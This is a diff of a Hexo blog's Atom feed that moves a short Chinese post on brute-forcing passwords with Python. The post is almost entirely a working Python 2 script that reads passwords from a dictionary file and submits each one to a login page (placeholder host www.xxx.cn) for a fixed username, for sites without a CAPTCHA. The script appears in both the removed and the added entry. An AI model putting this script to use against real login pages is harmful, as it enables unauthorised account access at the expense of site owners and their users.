@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://aiwanxia.github.io/"/>
-  <updated>2017-03-06T04:26:38.816Z</updated>
+  <updated>2017-03-06T04:22:21.539Z</updated>
   <id>https://aiwanxia.github.io/</id>
   
   <author>
@@ -14,46 +14,6 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
-  
-  <entry>
-    <title></title>
-    <link href="https://aiwanxia.github.io/2017/03/06/python%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/"/>
-    <id>https://aiwanxia.github.io/2017/03/06/python进行暴力破解密码/</id>
-    <published>2017-03-06T04:26:38.715Z</published>
-    <updated>2017-03-06T04:26:38.816Z</updated>
-    
-    <content type="html"><![CDATA[<hr>
-<p>title: python进行暴力破解<br>date: 2017-03-05 10:58:52</p>
-<h2 id="tags"><a href="#tags" class="headerlink" title="tags:"></a>tags:</h2><p>根据字典文件,使用python进行暴力破解,程序很简单<br>注：针对没有验证码的情况<br>实例代码</p>
-<pre><code>#encoding=utf-8
-import httplib,urllib
-conn = httplib.HTTPConnection(&quot;www.xxx.cn&quot;)
-f=open(&quot;dict.txt&quot;)
-while 1:
-    pwd=f.readline().strip()
-    if not pwd:
-        print &apos;字典已比对完。&apos;
-        break
-    params = urllib.urlencode({&apos;username&apos;: &apos;xxx&apos;, &apos;mod&apos;: &apos;&apos;, &apos;password&apos;: pwd})
-    headers = {&quot;Content-type&quot;: &quot;application/x-www-form-urlencoded&quot;,&quot;Accept&quot;: &quot;text/plain&quot;}
-    conn.request(&quot;GET&quot;, &quot;/login/aaa.asp&quot;, params, headers)
-    r = conn.getresponse()
-    print r.status, r.reason
-    data1 = r.read().decode(&apos;gbk&apos;)#编码根据实际情况酌情处理
-    print data1.index(u&apos;您输入的密码有误&apos;),&apos;您输入的密码\&apos;%s\&apos;有误&apos;%pwd
-conn.close()
-</code></pre>]]></content>
-    
-    <summary type="html">
-    
-      &lt;hr&gt;
-&lt;p&gt;title: python进行暴力破解&lt;br&gt;date: 2017-03-05 10:58:52&lt;/p&gt;
-&lt;h2 id=&quot;tags&quot;&gt;&lt;a href=&quot;#tags&quot; class=&quot;headerlink&quot; title=&quot;tags:&quot;&gt;&lt;/a&gt;tags:&lt;/h2&gt;&lt;p
-    
-    </summary>
-    
-    
-  </entry>
   
   <entry>
     <title>利用hexo与nodejs搭建博客</title>
@@ -250,6 +210,45 @@ INFO  Hexo is running at http://localhost:4000/. Press Ctrl+C to stop.
     <summary type="html">
     
       &lt;p&gt;hello,welcome to my personal blog!&lt;br&gt;搭建博客的时候遇见了很多坑，因为网上的教程大多都是hexo 2.X的，现在使用命令&lt;code&gt;npm install -g hexo-cli&lt;/code&gt;安装的是最新版本，所以会常常出错，但是，ne
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title></title>
+    <link href="https://aiwanxia.github.io/2017/03/05/python%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/"/>
+    <id>https://aiwanxia.github.io/2017/03/05/python进行暴力破解密码/</id>
+    <published>2017-03-05T02:58:52.000Z</published>
+    <updated>2017-03-06T04:34:54.729Z</updated>
+    
+    <content type="html"><![CDATA[<p>根据字典文件,使用python进行暴力破解,程序很简单<br>注：针对没有验证码的情况<br>实例代码</p>
+<p> <code>#encoding=utf-8
+    import httplib,urllib
+    conn = httplib.HTTPConnection(&quot;www.xxx.cn&quot;)
+    f=open(&quot;dict.txt&quot;)
+    while 1:
+        pwd=f.readline().strip()
+        if not pwd:
+            print &#39;字典已比对完。&#39;
+            break
+        params = urllib.urlencode({&#39;username&#39;: &#39;xxx&#39;, &#39;mod&#39;: &#39;&#39;, &#39;password&#39;: pwd})
+        headers = {&quot;Content-type&quot;: &quot;application/x-www-form-urlencoded&quot;,&quot;Accept&quot;: &quot;text/plain&quot;}
+        conn.request(&quot;GET&quot;, &quot;/login/aaa.asp&quot;, params, headers)
+        r = conn.getresponse()
+        print r.status, r.reason
+        data1 = r.read().decode(&#39;gbk&#39;)#编码根据实际情况酌情处理
+        print data1.index(u&#39;您输入的密码有误&#39;),&#39;您输入的密码\&#39;%s\&#39;有误&#39;%pwd
+    conn.close()</code></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;根据字典文件,使用python进行暴力破解,程序很简单&lt;br&gt;注：针对没有验证码的情况&lt;br&gt;实例代码&lt;/p&gt;
+&lt;p&gt; &lt;code&gt;#encoding=utf-8
+    import httplib,urllib
+    conn = httplib.HTTPConnec
     
     </summary>
     
